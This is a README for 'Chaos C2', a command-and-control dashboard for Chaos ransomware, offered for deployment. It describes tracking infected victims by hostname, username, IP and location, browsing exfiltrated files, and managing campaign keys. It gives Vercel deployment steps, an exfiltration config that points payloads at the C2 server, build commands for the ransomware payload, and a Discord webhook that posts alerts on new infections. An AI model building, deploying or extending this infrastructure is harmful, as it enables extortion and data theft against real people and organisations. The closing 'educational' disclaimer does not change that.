# Chaos C2 - Advanced Command & Control Dashboard

A sophisticated, real-time C2 dashboard for Chaos Ransomware with campaign management, affected systems tracking, geographic visualization, and live analytics.

## Features

### 🎯 Campaign & Key Management
- **Create/Edit/Delete Campaigns** - Full CRUD with modal forms
- **API Key Management** - Generate, copy, regenerate keys per campaign
- **RSA Key Configuration** - 2048/4096 bit selection
- **Campaign Status** - Active, Paused, Archived states
- **Per-Campaign Statistics** - Infections, files, data, systems

### 🖥️ Affected Systems Tracking
- **Real-time System Registry** - Auto-registration on first payload execution
- **Forensic Details** - Hostname, username, OS, IP, ISP, GeoIP (country/city)
- **Status Tracking** - Active (green), Idle (amber), Offline (gray)
- **Statistics** - Files encrypted, exfiltrated, bytes, ransom note status
- **File Explorer** - Browse exfiltrated files per system with metadata
- **CSV Export** - Full system data export
- **Advanced Filtering** - Search, status filter, campaign filter
- **Pagination** - Handles thousands of systems

### 📊 Live Analytics & Visualizations
| Chart Type | Data | Real-time |
|------------|------|-----------|
| **Daily Activity** | Uploads + MB (bar + line) | ✅ SSE |
| **Extensions Treemap** | File type distribution | ✅ SSE |
| **Status Donut** | Active/Idle/Offline | ✅ SSE |
| **Volume Timeline** | Files/MB/Data over 30d | ✅ SSE |
| **Extension Bar** | Horizontal stacked bars | ✅ |
| **Activity Heatmap** | Hour vs Day matrix | ✅ |
| **Campaign Radar** | Multi-dimensional comparison | ✅ |
| **Geo Bar Chart** | Top countries | ✅ |
| **Infection Timeline** | Event stream with types | ✅ SSE |

### 🌍 Geographic Intelligence
- **Country Aggregation** - Infections per country with counts
- **City-Level Detail** - City, country, ISP, system counts
- **Top Countries Leaderboard** - Ranked list with stats
- **ISP Tracking** - Internet provider identification

### ⚡ Real-time Updates (Server-Sent Events)
- **Global Stats** - Live counters for infections, files, bytes
- **System List** - New infections appear instantly
- **Campaign Stats** - Per-campaign updates
- **New File Alerts** - Individual file exfiltration events
- **Heartbeat** - 30s connection health checks
- **Auto-reconnect** - Exponential backoff on disconnect

### 🔐 Authentication
- **Master Key** - Full admin access (all campaigns)
- **Campaign Keys** - Scoped to single campaign
- **Role-based Permissions** - Admin vs Campaign viewer
- **Session Persistence** - Remembers auth across reloads

### 🎨 Premium Dark Theme
- **Color Palette** - Deep amber/gold (`#d6781e`) on near-black (`#050505`)
- **Semantic Colors** - Emerald (success), Amber (warning), Rose (danger), Sky (info), Violet (special), Cyan (accent)
- **Glassmorphism** - Frosted glass cards with subtle borders
- **Micro-animations** - Staggered entrance, hover lifts, pulse indicators
- **Responsive** - Collapsible sidebar, mobile tabs, adaptive grids
- **Accessibility** - Reduced motion, focus states, semantic HTML

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        VERCEL EDGE NETWORK                       │
├─────────────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐             │
│  │  /api/      │  │  /api/      │  │  /api/      │             │
│  │  campaigns  │  │  systems    │  │  realtime   │             │
│  │  (CRUD)     │  │  (CRUD)     │  │  (SSE)      │             │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘             │
│         │                │                │                    │
│         └────────────────┼────────────────┘                    │
│                          ▼                                    │
│                 ┌─────────────────┐                            │
│                 │   VERCEL KV     │                            │
│                 │  (Redis)        │                            │
│                 │  ┌───────────┐  │                            │
│                 │  │ campaign:*│  │                            │
│                 │  │ system:*  │  │                            │
│                 │  │ file:*    │  │                            │
│                 │  │ global:*  │  │                            │
│                 │  └───────────┘  │                            │
│                 └─────────────────┘                            │
└─────────────────────────────────────────────────────────────────┘
                          ▲
                          │ HTTPS + API Key
         ┌────────────────┼────────────────┐
         ▼                ▼                ▼
    ┌─────────┐     ┌─────────┐     ┌─────────┐
    │ Payload │     │ Payload │     │ Payload │  (Multiple infections)
    │ System 1│     │ System 2│     │ System N│
    └─────────┘     └─────────┘     └─────────┘
```

## Quick Deploy

```bash
cd vercel-dashboard

# 1. Install Vercel CLI
npm i -g vercel

# 2. Login
vercel login

# 3. Deploy
vercel --prod

# 4. Create KV Database
# Vercel Dashboard → Storage → Create Database → KV
# Copy KV_REST_API_URL and KV_REST_API_TOKEN to Project Settings → Environment Variables
```

## Payload Integration

### 1. Configure Exfiltration
```json
{
  "exfiltration": {
    "enabled": true,
    "serverUrl": "https://your-project.vercel.app",
    "apiKey": "ck_yourcampaignkey",
    "maxFileSizeMB": 50,
    "targetExtensions": [".txt", ".doc", ".pdf", ".sql", ".json", ".cs", ".py"],
    "skipExtensions": [".exe", ".dll", ".sys"],
    "maxFiles": 1000,
    "compress": true,
    "encrypt": true,
    "timeoutSeconds": 30,
    "retryCount": 3,
    "retryDelaySeconds": 5
  }
}
```

### 2. Use Enhanced Exfiltration Module
Replace the `Exfiltration` class in `PayloadSource_v2.cs` with `Exfiltration_FullIntegration.cs` which adds:
- Automatic system registration on first run
- Periodic heartbeat with encryption/exfil stats
- File upload with `X-File-Name` and `X-System-Id` headers
- Ransom note tracking

### 3. Build Payload
```bash
dotnet run -- gen-keys -d ./keys -n mycampaign
dotnet run -- build -c payload.config.json --keys-dir ./keys --key-name mycampaign
```

## Dashboard Usage

### Access
Visit `https://your-project.vercel.app/dashboard`

### Authentication
1. Click **Sign In** (top right)
2. Enter **Master API Key** (set `MASTER_API_KEY` in Vercel env vars) OR **Campaign API Key**
3. Dashboard scopes to your campaign automatically

### Navigation
| View | Purpose |
|------|---------|
| **Overview** | Global stats, daily charts, recent infections, campaign performance |
| **Systems** | Full system table with search, filters, pagination, export |
| **Campaigns** | Campaign cards with keys, stats, actions |
| **Analytics** | 30-day trends, extensions, heatmap, campaign radar |
| **Geographic** | Country/city breakdown, ISP tracking |
| **Timeline** | Real-time event stream, time-series charts |
| **Files** | File explorer (filter by system/campaign) |

### Campaign Management
- **Create**: Click `+ New Campaign` in sidebar or Campaigns view
- **Edit**: Click `Details` → `Edit` on any campaign card
- **API Keys**: Copy (clipboard icon) or Regenerate (refresh icon)
- **Delete**: Removes campaign + all systems + all files

### System Actions
- **View Details**: Click any row → forensic modal with files
- **Delete**: Remove from tracking (trash icon)
- **Export CSV**: All filtered systems → `systems_YYYY-MM-DD.csv`

## KV Data Model

```
campaign:{id}                    → { id, name, apiKey, status, createdAt, stats, settings }
campaign:{id}:stats              → HASH { totalInfections, totalFiles, totalBytes, lastActivity }
campaign:{id}:systems            → SET of systemIds

system:{id}                      → { id, victimId, campaignId, hostname, username, os, ip, country, city, isp, status, firstSeen, lastSeen, tags }
system:{id}:stats                → HASH { filesEncrypted, filesExfiltrated, bytesExfiltrated, ransomNoteDropped }
system:{id}:files                → SET of fileIds
system:{id}:campaigns            → SET of campaignIds

file:{id}:meta                   → { id, infectionId, systemId, fileName, fileExt, size, uploadedAt, contentType }
file:{id}:data                   → base64 content (TTL: 30d)

global:campaigns                 → SET of campaignIds
global:systems                   → SET of systemIds
global:stats                     → HASH { totalInfections, totalFiles, totalBytes }
global:daily:{YYYY-MM-DD}        → HASH { uploads, bytes }
```

## Vercel Limits (Hobby Plan)

| Resource | Limit | Notes |
|----------|-------|-------|
| KV Storage | 256 MB | ~2M small records |
| KV Reads/Day | 100,000 | Dashboard polls + SSE |
| KV Writes/Day | 10,000 | System registrations + heartbeats |
| Function Duration | 30s | Configured in vercel.json |
| Bandwidth | 100 GB/mo | File exfiltration counts |

**For production**: Upgrade to Pro for 1GB KV, 1M reads, 100K writes, 60s functions.

## Customization

### Add Discord/Slack Alerts
```javascript
// In api/systems/index.js POST handler, after new system:
await fetch('https://discord.com/api/webhooks/WEBHOOK_ID/TOKEN', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ 
    content: `🦠 **New Infection**\nSystem: ${system.hostname}\nCampaign: ${campaign.name}\nLocation: ${city}, ${country}` 
  })
});
```

### Custom Chart Types
Add to `app.js`:
```javascript
// Example: Scatter plot for file size vs time
new Chart(ctx, {
  type: 'scatter',
  data: { datasets: [{ label: 'Files', data: files.map(f => ({ x: f.uploadedAt, y: f.size })) }] },
  options: { scales: { x: { type: 'time' }, y: { type: 'logarithmic' } } }
});
```

### Add Authentication Middleware
```javascript
// In vercel.json, add middleware or check in each API route
// Example: require ?key=secret or HTTP Basic Auth
```

## Security Considerations

- **No auth on dashboard by default** - Deploy to Vercel Preview with password protection or add auth middleware
- **API keys are campaign identifiers**, not cryptographic secrets
- **Vercel KV encrypted at rest** (managed by Vercel)
- **CORS enabled** for payload uploads from any origin
- **Consider**: Rate limiting, IP allowlisting, audit logging

## File Structure

```
vercel-dashboard/
├── api/
│   ├── auth/verify.js          # API key verification
│   ├── campaigns/index.js      # Campaign CRUD
│   ├── exfil/upload.js         # File ingestion → KV
│   ├── realtime/events.js      # SSE endpoint
│   ├── stats/index.js          # Aggregated statistics
│   └── systems/index.js        # System CRUD + registration
├── dashboard/
│   ├── index.html              # Main dashboard (HTML + CSS)
│   └── app.js                  # Application logic (68KB)
├── Exfiltration_FullIntegration.cs  # Enhanced payload module
├── Exfiltration_DashboardCompatible.cs  # Basic payload module
├── payload.config.dashboard.json      # Pre-configured payload config
├── vercel.json                 # Vercel config + rewrites
├── package.json                # @vercel/kv dependency
├── README.md                   # This file
└── INTEGRATION_GUIDE.md        # Step-by-step setup
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| "KV not configured" | Add `KV_REST_API_URL` + `KV_REST_API_TOKEN` to Vercel env vars |
| SSE disconnects | Check function timeout (30s), verify Vercel plan |
| Systems not appearing | Verify payload `serverUrl` + `/api/systems` POST |
| Charts empty | Wait for SSE data or click Refresh |
| Auth fails | Verify API key matches campaign `apiKey` field |
| Large files missing | Hobby KV limit 100KB/key - only metadata stored |

## License

Educational/Research purposes only. Unauthorized deployment against systems you don't own is illegal.